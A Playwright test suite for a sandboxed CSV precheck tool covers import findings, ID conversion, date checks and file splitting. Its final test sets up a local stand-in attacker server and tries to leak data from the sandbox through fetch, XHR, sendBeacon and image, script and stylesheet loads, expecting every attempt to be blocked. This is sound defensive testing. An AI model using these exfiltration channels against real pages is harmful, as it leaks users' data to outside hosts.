import { readFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { fileURLToPath } from "node:url";
import { expect, test, type Download, type Frame, type Page } from "@playwright/test";
import { unzip } from "../src/shared/unzip.testing";

// A stand-in for an attacker's server: any request reaching it means data could leave the page.
let exfil: Server;
let exfilUrl: string;
let exfilHits: string[];

test.beforeAll(async () => {
  exfil = createServer((req, res) => {
    exfilHits.push(req.url ?? "");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.end("ok");
  });
  await new Promise<void>((resolve) => exfil.listen(0, "127.0.0.1", resolve));
  exfilUrl = `http://127.0.0.1:${(exfil.address() as AddressInfo).port}`;
});

test.afterAll(() => new Promise<void>((resolve) => exfil.close(() => resolve())));

test.beforeEach(() => {
  exfilHits = [];
});

async function sandbox(page: Page): Promise<Frame> {
  await page.goto("/csv-precheck/");
  const frame = page.frame({ url: /\/sandbox\/csv-precheck\/$/ });
  if (!frame) throw new Error("sandbox frame not found");
  await frame.waitForLoadState();
  return frame;
}

async function openCsv(
  frame: Frame,
  contents: string | Buffer = "Id,Name\n001000000000001,Acme\n",
  name = "accounts.csv",
) {
  await frame.locator("#file").setInputFiles({
    name,
    mimeType: "text/csv",
    buffer: Buffer.from(contents),
  });
}

const raggedFixture = readFileSync(
  fileURLToPath(new URL("./fixtures/ragged-duplicate.csv", import.meta.url)),
);
const repeatedKeyFixture = readFileSync(
  fileURLToPath(new URL("./fixtures/repeated-key.csv", import.meta.url)),
);
const twentyFiveRowsFixture = readFileSync(
  fileURLToPath(new URL("./fixtures/twenty-five-rows.csv", import.meta.url)),
);
const bomFixture = readFileSync(
  fileURLToPath(new URL("./fixtures/bom-trailing-space.csv", import.meta.url)),
);
const idsFixture = readFileSync(fileURLToPath(new URL("./fixtures/ids.csv", import.meta.url)));
const datesFixture = readFileSync(fileURLToPath(new URL("./fixtures/dates.csv", import.meta.url)));

async function downloadBytes(download: Download): Promise<Buffer> {
  const chunks: Buffer[] = [];
  for await (const chunk of await download.createReadStream()) chunks.push(chunk as Buffer);
  return Buffer.concat(chunks);
}

test("sandbox pages ship the CSP header", async ({ request }) => {
  const res = await request.get("/sandbox/csv-precheck/");
  const csp = res.headers()["content-security-policy"];
  expect(csp).toContain("connect-src 'none'");
  expect(csp).toContain("default-src 'none'");
  expect(csp).toContain("frame-ancestors 'self'");
});

test("the iframe is sandboxed without same-origin access", async ({ page }) => {
  await page.goto("/csv-precheck/");
  const flags = await page.locator("iframe.sandbox-frame").getAttribute("sandbox");
  expect(flags?.split(" ").sort()).toEqual(["allow-downloads", "allow-scripts"]);
});

test("a clean file shows no problems with its counts, and the report downloads", async ({
  page,
}) => {
  const frame = await sandbox(page);
  await openCsv(frame);
  await expect(frame.locator("#file-name")).toHaveText("accounts.csv");
  await expect(frame.locator("#summary")).toHaveText("1 row, 2 columns, comma-delimited");
  await expect(frame.locator("#id-line")).toHaveText('ID column: column 1 "Id"');
  await expect(frame.locator("#clean")).toBeVisible();
  await expect(frame.locator(".finding")).toHaveCount(0);

  const [download] = await Promise.all([
    page.waitForEvent("download"),
    frame.locator("#download").click(),
  ]);
  const body = await download.createReadStream().then(async (stream) => {
    const chunks: Buffer[] = [];
    for await (const chunk of stream) chunks.push(chunk as Buffer);
    return Buffer.concat(chunks).toString();
  });
  expect(body).toBe(
    'File: accounts.csv\n1 row, 2 columns, comma-delimited\nID column: column 1 "Id"\n\nNo problems found.\n',
  );
});

test("a file with ragged rows and a duplicate header shows those findings", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, raggedFixture.toString(), "ragged-duplicate.csv");
  await expect(frame.locator("#summary")).toHaveText("5 rows, 4 columns, comma-delimited");
  await expect(frame.locator("#clean")).toBeHidden();

  const kinds = await frame
    .locator(".finding")
    .evaluateAll((els) => els.map((el) => (el as HTMLElement).dataset.kind));
  expect(kinds).toEqual([
    "duplicate-header",
    "row-too-few-columns",
    "row-too-many-columns",
    "line-breaks",
  ]);

  const duplicate = frame.locator('[data-kind="duplicate-header"]');
  await expect(duplicate).toContainText('Columns 2 "Name", 4 "name"');
  await expect(duplicate.locator(".severity")).toHaveText("Error");

  const tooMany = frame.locator('[data-kind="row-too-many-columns"]');
  await expect(tooMany.locator(".count")).toHaveText("(2)");
  await expect(tooMany.locator(".example")).toHaveText([
    "Row 3 (line 4): Error reading data row #2: the number of columns (5) exceeds the number of columns in the header (4)",
    "Row 4 (line 5): Error reading data row #3: the number of columns (5) exceeds the number of columns in the header (4)",
  ]);
  await expect(frame.locator('[data-kind="row-too-few-columns"] .example')).toHaveText(
    "Row 2 (line 3): Error reading data row #1: the number of columns (3) is less than the number of columns in the header (4)",
  );
});

test("a file with a byte order mark and a trailing space shows both findings", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, bomFixture, "bom-trailing-space.csv");
  await expect(frame.locator("#summary")).toHaveText("2 rows, 3 columns, comma-delimited");
  const kinds = await frame
    .locator(".finding")
    .evaluateAll((els) => els.map((el) => (el as HTMLElement).dataset.kind));
  expect(kinds).toEqual(["utf8-bom", "surrounding-spaces"]);

  const bom = frame.locator('[data-kind="utf8-bom"]');
  await expect(bom.locator(".severity")).toHaveText("Error");
  await expect(bom.locator(".example")).toHaveText(
    "CSV Error: Invalid CSV file format. Please select a different file. Error getting header row from the CSV file",
  );
  // The first header is read as "Id", not with the mark stuck to it.
  await expect(frame.locator("#key-column option").nth(1)).toHaveText("Id");
  await expect(frame.locator('[data-kind="surrounding-spaces"] .example')).toHaveText(
    'column 2 "Name": Row 1, such as "Acme "',
  );
});

test("bad IDs show their findings, and 15-character IDs convert to 18", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, idsFixture, "ids.csv");
  await expect(frame.locator("#id-line")).toHaveText(
    'ID columns: column 1 "Id", column 3 "AccountId"',
  );
  const kinds = await frame
    .locator(".finding")
    .evaluateAll((els) => els.map((el) => (el as HTMLElement).dataset.kind));
  expect(kinds).toEqual(["malformed-id", "id-checksum", "mixed-id-lengths"]);

  const malformed = frame.locator('[data-kind="malformed-id"]');
  await expect(malformed.locator(".severity")).toHaveText("Error");
  await expect(malformed.locator(".example")).toHaveText(
    'Row 2 (line 3), column 1 "Id": "001D000000IqhS": 14 characters, not 15 or 18',
  );
  await expect(frame.locator('[data-kind="id-checksum"] .example')).toHaveText(
    'Row 3 (line 4), column 1 "Id": "001xx000003DHurAAA" ends in "AAA", but its first 15 characters give "AAG"',
  );

  await expect(frame.locator("#convert-plan")).toHaveText("3 IDs of 15 characters to convert.");
  const [download] = await Promise.all([
    page.waitForEvent("download"),
    frame.locator("#convert-download").click(),
  ]);
  expect(download.suggestedFilename()).toBe("ids-18-char-ids.csv");
  expect((await downloadBytes(download)).toString()).toBe(
    idsFixture
      .toString()
      .replace("001D000000IqhSL,", "001D000000IqhSLIAZ,")
      .replace("001R0000005hDFY\n", "001R0000005hDFYIA2\n")
      .replace("00300000003T2PG\n", "00300000003T2PGAA0\n"),
  );
});

test("slash dates in both orders conflict with either date setting", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, datesFixture, "dates.csv");
  await expect(frame.locator("#date-line")).toHaveText(
    'Date column: column 2 "Due" (Use European date format off)',
  );
  await expect(frame.locator("#european")).not.toBeChecked();
  const kinds = () =>
    frame
      .locator(".finding")
      .evaluateAll((els) => els.map((el) => (el as HTMLElement).dataset.kind));
  expect(await kinds()).toEqual(["invalid-date", "date-order-conflict"]);

  const conflict = frame.locator('[data-kind="date-order-conflict"]');
  await expect(conflict.locator(".severity")).toHaveText("Error");
  await expect(conflict.locator(".example")).toHaveText(
    'Row 1 (line 2), column 2 "Due": "13/02/2024" can only be day first (dd/MM/yyyy), but Use European date format is off; row 2 "02/13/2024" can only be month first, so the column mixes both orders',
  );
  await expect(frame.locator('[data-kind="invalid-date"] .example')).toHaveText(
    'Row 1 (line 2), column 2 "Due": Error converting value to correct data type: Failed to parse date: 13/02/2024',
  );

  // The setting re-runs the checks on the file already open.
  await frame.locator("#european").check();
  await expect(frame.locator("#date-line")).toHaveText(
    'Date column: column 2 "Due" (Use European date format on)',
  );
  await expect(conflict.locator(".example")).toHaveText(
    'Row 2 (line 3), column 2 "Due": "02/13/2024" can only be month first (MM/dd/yyyy), but Use European date format is on; row 1 "13/02/2024" can only be day first, so the column mixes both orders',
  );
  await expect(frame.locator('[data-kind="invalid-date"] .example')).toHaveText(
    'Row 2 (line 3), column 2 "Due": Error converting value to correct data type: Failed to parse date: 02/13/2024',
  );
});

test("a file without 15-character IDs offers no conversion", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, "Name,Phone\nAcme,555-0100\n");
  await expect(frame.locator("#id-line")).toBeHidden();
  await expect(frame.locator("#convert")).toBeHidden();
});

test("repeated rows show, and picking a key column shows its repeated values", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, repeatedKeyFixture.toString(), "repeated-key.csv");
  await expect(frame.locator('[data-kind="duplicate-row"] .example')).toHaveText("Rows 2, 7");
  await expect(frame.locator('[data-kind="duplicate-key"]')).toHaveCount(0);
  await expect(frame.locator("#key-line")).toBeHidden();

  await frame.locator("#key-column").selectOption({ label: "Account_Number__c" });
  const keyed = frame.locator('[data-kind="duplicate-key"]');
  await expect(keyed.locator(".finding-title")).toContainText(
    'Repeated values in key column 2 "Account_Number__c"',
  );
  await expect(keyed.locator(".example")).toHaveText(['"AC-200": Rows 2, 4, 7']);
  await expect(frame.locator("#key-line")).toHaveText(
    'Key column 2 "Account_Number__c", compared exactly as written',
  );

  await frame.locator("#key-loose").check();
  await expect(keyed.locator(".example")).toHaveText([
    '"AC-100": Rows 1, 3',
    '"AC-200": Rows 2, 4, 7',
  ]);
  await expect(frame.locator("#key-line")).toContainText(
    "ignoring letter case and surrounding spaces",
  );

  const [download] = await Promise.all([
    page.waitForEvent("download"),
    frame.locator("#download").click(),
  ]);
  const body = await download.createReadStream().then(async (stream) => {
    const chunks: Buffer[] = [];
    for await (const chunk of stream) chunks.push(chunk as Buffer);
    return Buffer.concat(chunks).toString();
  });
  expect(body).toContain('  - "AC-100": Rows 1, 3\n');

  await frame.locator("#key-column").selectOption({ label: "None" });
  await expect(keyed).toHaveCount(0);
  await expect(frame.locator("#key-line")).toBeHidden();
  await expect(frame.locator('[data-kind="duplicate-row"]')).toHaveCount(1);
});

test("opening another file resets the key column to its own headers", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, repeatedKeyFixture.toString(), "repeated-key.csv");
  await frame.locator("#key-column").selectOption({ label: "Name" });
  await expect(frame.locator('[data-kind="duplicate-key"]')).toHaveCount(1);

  await openCsv(frame, "Id,\n1,a\n1,a\n", "other.csv");
  await expect(frame.locator("#key-column option")).toHaveText(["None", "Id", "Column 2"]);
  await expect(frame.locator("#key-column")).toHaveValue("");
  await expect(frame.locator('[data-kind="duplicate-key"]')).toHaveCount(0);
});

test("splitting 25 rows by 10 downloads a zip of three parts with the header", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, twentyFiveRowsFixture.toString(), "accounts.csv");
  await expect(frame.locator("#split-rows")).toHaveValue("10000");
  await expect(frame.locator("#split-plan")).toHaveText(
    "1 file, accounts-part-001.csv, with all 25 rows.",
  );

  await frame.locator("#split-rows").fill("10");
  await expect(frame.locator("#split-plan")).toHaveText(
    "3 files, accounts-part-001.csv to accounts-part-003.csv.",
  );
  const [download] = await Promise.all([
    page.waitForEvent("download"),
    frame.locator("#split-download").click(),
  ]);
  expect(download.suggestedFilename()).toBe("accounts-parts.zip");

  const parts = unzip(await downloadBytes(download));
  expect(parts.map((p) => p.name)).toEqual([
    "accounts-part-001.csv",
    "accounts-part-002.csv",
    "accounts-part-003.csv",
  ]);
  const texts = parts.map((p) => Buffer.from(p.data).toString());
  const original = twentyFiveRowsFixture.toString();
  const header = "Id,Name,Note\n";
  expect(texts.every((t) => t.startsWith(header))).toBe(true);
  // Row 10's quoted line break stays inside the first part.
  expect(texts[0].endsWith('10,Account 10,"Line one\nline two"\n')).toBe(true);
  expect(texts.map((t) => t.slice(header.length)).join("")).toBe(original.slice(header.length));
  const rowCounts = texts.map((t) => (t.match(/^\d+,Account/gm) ?? []).length);
  expect(rowCounts).toEqual([10, 10, 5]);
});

test("rows per file must be a whole number of at least 1", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame);
  await frame.locator("#split-rows").fill("0");
  await expect(frame.locator("#split-plan")).toHaveText("Enter a whole number of at least 1.");
  await expect(frame.locator("#split-download")).toBeDisabled();
  await frame.locator("#split-rows").fill("1");
  await expect(frame.locator("#split-download")).toBeEnabled();
});

test("a file with no data rows offers no split", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, "Id,Name\n");
  await expect(frame.locator("#summary")).toHaveText("0 rows, 2 columns, comma-delimited");
  await expect(frame.locator("#split")).toBeHidden();
});

test("a file over 10,000 rows suggests splitting it", async ({ page }) => {
  const frame = await sandbox(page);
  const rows = Array.from({ length: 10_001 }, (_, i) => `${i},x\n`).join("");
  await openCsv(frame, "Id,Name\n" + rows);
  await expect(frame.locator('[data-kind="batch-limit"] .example')).toHaveText(
    "10,001 data rows, more than the Bulk API's 10,000 records per batch",
  );
});

test("thousands of ragged rows read as one finding with a count", async ({ page }) => {
  const frame = await sandbox(page);
  // Distinct rows, so the duplicate-row check stays quiet.
  const rows = Array.from({ length: 5000 }, (_, i) => `${i},2,3\n`).join("");
  await openCsv(frame, "a,b\n" + rows);
  const finding = frame.locator(".finding");
  await expect(finding).toHaveCount(1);
  await expect(finding.locator(".count")).toHaveText("(5,000)");
  await expect(finding.locator(".example")).toHaveCount(5);
  await expect(finding.locator(".more")).toHaveText("and 4,995 more");
});

test("opening a second file replaces the first report", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame, raggedFixture.toString(), "ragged-duplicate.csv");
  await expect(frame.locator(".finding")).toHaveCount(4);

  await openCsv(frame, "Name,Phone\nAcme,555-0100\nBeta,555-0101\n", "clean.csv");
  await expect(frame.locator("#file-name")).toHaveText("clean.csv");
  await expect(frame.locator("#summary")).toHaveText("2 rows, 2 columns, comma-delimited");
  await expect(frame.locator(".finding")).toHaveCount(0);
  await expect(frame.locator("#clean")).toBeVisible();
});

test("the report fits a phone-width screen", async ({ page }) => {
  await page.setViewportSize({ width: 360, height: 740 });
  const frame = await sandbox(page);
  await openCsv(frame, raggedFixture.toString(), "ragged-duplicate.csv");
  await expect(frame.locator(".finding")).toHaveCount(4);
  const overflow = await frame.evaluate(
    () => document.documentElement.scrollWidth - document.documentElement.clientWidth,
  );
  expect(overflow).toBeLessThanOrEqual(0);
});

test("the hosting page cannot read the sandbox document", async ({ page }) => {
  await sandbox(page);
  const access = await page.evaluate(() => {
    const iframe = document.querySelector<HTMLIFrameElement>("iframe.sandbox-frame")!;
    try {
      return iframe.contentDocument === null ? "blocked" : "readable";
    } catch {
      return "blocked";
    }
  });
  expect(access).toBe("blocked");
});

test("the sandbox cannot send anything over the network", async ({ page }) => {
  const frame = await sandbox(page);
  await openCsv(frame);

  const outcomes = await frame.evaluate(async (target) => {
    const attempt = (p: Promise<unknown>) =>
      p.then(
        () => "sent",
        () => "blocked",
      );
    const settle = (el: HTMLElement & { onload: unknown; onerror: unknown }) =>
      new Promise<string>((resolve) => {
        el.onload = () => resolve("sent");
        el.onerror = () => resolve("blocked");
        document.body.append(el);
        setTimeout(() => resolve("blocked"), 2000);
      });

    const img = document.createElement("img");
    img.src = `${target}/img`;
    const script = document.createElement("script");
    script.src = `${target}/script`;
    const style = document.createElement("link");
    style.rel = "stylesheet";
    style.href = `${target}/style`;

    return {
      fetch: await attempt(fetch(`${target}/fetch`)),
      fetchSameOrigin: await attempt(fetch("/")),
      xhr: await new Promise<string>((resolve) => {
        const xhr = new XMLHttpRequest();
        try {
          xhr.open("GET", `${target}/xhr`);
          xhr.onload = () => resolve("sent");
          xhr.onerror = () => resolve("blocked");
          xhr.send();
        } catch {
          resolve("blocked");
        }
      }),
      beacon: navigator.sendBeacon(`${target}/beacon`, "data") ? "queued" : "blocked",
      img: await settle(img),
      script: await settle(script),
      style: await settle(style),
    };
  }, exfilUrl);

  expect(outcomes).toMatchObject({
    fetch: "blocked",
    fetchSameOrigin: "blocked",
    xhr: "blocked",
    img: "blocked",
    script: "blocked",
    style: "blocked",
  });
  // sendBeacon may report "queued" before CSP drops it; what counts is that nothing arrives.
  await page.waitForTimeout(500);
  expect(exfilHits).toEqual([]);
});
